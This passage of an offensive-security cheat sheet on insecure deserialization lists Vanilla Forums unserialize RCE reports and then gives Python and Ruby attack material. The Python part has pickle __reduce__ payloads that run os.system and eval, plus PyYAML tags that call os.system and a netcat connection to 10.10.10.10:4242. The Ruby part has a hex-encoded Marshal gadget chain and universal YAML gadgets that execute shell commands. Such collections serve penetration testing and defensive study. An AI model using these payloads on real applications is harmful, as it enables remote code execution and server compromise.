* [Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410237)
* [Vanilla Forums Xenforo password splitHash Unserialize Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/410212)
* [Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical) - Steven Seeley](https://hackerone.com/reports/410882)
* [Vanilla Forums Gdn_Format unserialize() Remote Code Execution Vulnerability - Steven Seeley](https://hackerone.com/reports/407552)


---

# Python Deserialization

> Python deserialization is the process of reconstructing Python objects from serialized data, commonly done using formats like JSON, pickle, or YAML. The pickle module is a frequently used tool for this in Python, as it can serialize and deserialize complex Python objects, including custom classes.

## Tools

* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - Serialized payload for deserialization RCE attack on python driven applications where pickle,PyYAML, ruamel.yaml or jsonpickle module is used for deserialization of serialized data.

## Methodology

In Python source code, look for these sinks:

* `cPickle.loads`
* `pickle.loads`
* `_pickle.loads`
* `jsonpickle.decode`

### Pickle

The following code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object.
:warning: `import cPickle` will only work on Python 2

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)
```

The vulnerability is introduced when a token is loaded from an user input.

```python
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)
```

Python 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server.

> The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.

```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

A universal payload can be created by loading `os` at runtime using eval:

```python
import pickle
import base64

class RCE:
    def __reduce__(self):
        return eval, ("__import__('os').system('whoami')",)
pickled = pickle.dumps(RCE())
print(base64.b64encode(pickled).decode())
```

This approach allows running arbitrary python code, which allows us to use different techniques from code injection:

```python
__import__('os').system('whoami') # Reflected RCE
getattr('', __import__('os').popen('whoami').read()) # Error-Based RCE
1 / (__include__("os").popen("id")._proc.wait() == 0) # Boolean-Based RCE
__include__("os").popen("id && sleep 5").read() # Time-Based RCE
```

### PyYAML

YAML deserialization is the process of converting YAML-formatted data back into objects in programming languages like Python, Ruby, or Java. YAML (YAML Ain't Markup Language) is popular for configuration files and data serialization because it is human-readable and supports complex data structures.

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

Since PyYaml version 6.0, the default loader for `load` has been switched to SafeLoader mitigating the risks against Remote Code Execution. [PR #420 - Fix](https://github.com/yaml/pyyaml/issues/420)

The vulnerable sinks are now `yaml.unsafe_load` and `yaml.load(input, Loader=yaml.UnsafeLoader)`.

```py
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,Loader=yaml.UnsafeLoader)
```


---

# Ruby Deserialization

> Ruby deserialization is the process of converting serialized data back into Ruby objects, often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it can serialize and deserialize complex Ruby objects.

## Marshal Deserialization

Script to generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5

```ruby
for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load(["0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446"].pack("H*")) rescue nil'; done
```

## YAML Deserialization

Vulnerable code

```ruby
require "yaml"
YAML.load(File.read("p.yml"))
```

Universal gadget for ruby <= 2.7.2:

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

Universal gadget for ruby 2.x - 3.x.

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

```yaml
 ---
 - !ruby/object:Gem::Installer
     i: x
 - !ruby/object:Gem::SpecFetcher
     i: y
 - !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve 
```
